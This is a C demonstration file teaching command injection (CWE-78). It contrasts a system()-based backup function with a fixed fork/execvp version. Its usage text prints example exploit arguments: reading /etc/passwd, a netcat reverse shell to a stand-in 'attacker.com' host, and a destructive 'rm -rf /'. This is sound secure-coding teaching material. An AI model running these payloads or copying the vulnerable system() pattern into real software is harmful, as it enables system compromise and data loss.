/*
 * VULNERABILITY: Command Injection (CWE-78)
 *
 * When user-supplied data is passed to a shell interpreter (system(),
 * popen(), exec with /bin/sh -c), shell metacharacters in the input
 * are interpreted as commands, allowing arbitrary command execution.
 *
 * PRINCIPLE: Never pass user data to a shell. Use fork() + execve()
 * which passes arguments directly to the target program without
 * shell interpretation.
 *
 * IMPACT: Full system compromise — attacker commands run with the
 * server's privileges.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

/* VULNERABLE: uses system() with user-supplied path */
static void config_backup_vuln(const char *dest_path) {
    char cmd[1024];

    /* BUG: dest_path is concatenated into a shell command.
     * Shell metacharacters (;, |, &&, $(), ``, etc.) execute. */
    snprintf(cmd, sizeof(cmd), "cp -r /etc/securefile %s", dest_path);

    printf("[*] Executing: %s\n", cmd);
    int ret = system(cmd);
    if (ret != 0) {
        printf("[-] Backup failed (exit=%d)\n", ret);
    } else {
        printf("[+] Backup completed to %s\n", dest_path);
    }
}

/* FIXED: uses fork+execve, no shell involved */
static void config_backup_fixed(const char *dest_path) {
    pid_t pid = fork();
    if (pid == 0) {
        /* Child: exec directly, arguments are not parsed by shell */
        const char *argv[] = { "cp", "-r", "/etc/securefile", dest_path, NULL };
        execvp("cp", (char * const *)argv);
        _exit(127);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        printf("[+] Backup completed (status=%d)\n", WEXITSTATUS(status));
    } else {
        printf("[-] Fork failed\n");
    }
}

int main(int argc, char *argv[]) {
    printf("=== CWE-78: Command Injection Demo ===\n\n");

    if (argc < 2) {
        printf("Usage: %s <backup_path>\n", argv[0]);
        printf("\n  Safe:     %s /tmp/backup\n", argv[0]);
        printf("  Exploit:  %s \"/tmp/x; cat /etc/passwd\"\n", argv[0]);
        printf("  Exploit:  %s \"/tmp/x && nc attacker.com 4444 -e /bin/sh\"\n", argv[0]);
        printf("  Exploit:  %s \"/tmp/x; rm -rf /\"  (destructive!)\n", argv[0]);
        return 0;
    }

    printf("\n--- Vulnerable (system) ---\n");
    config_backup_vuln(argv[1]);

    printf("\n--- Fixed (fork+exec) ---\n");
    config_backup_fixed(argv[1]);

    return 0;
}
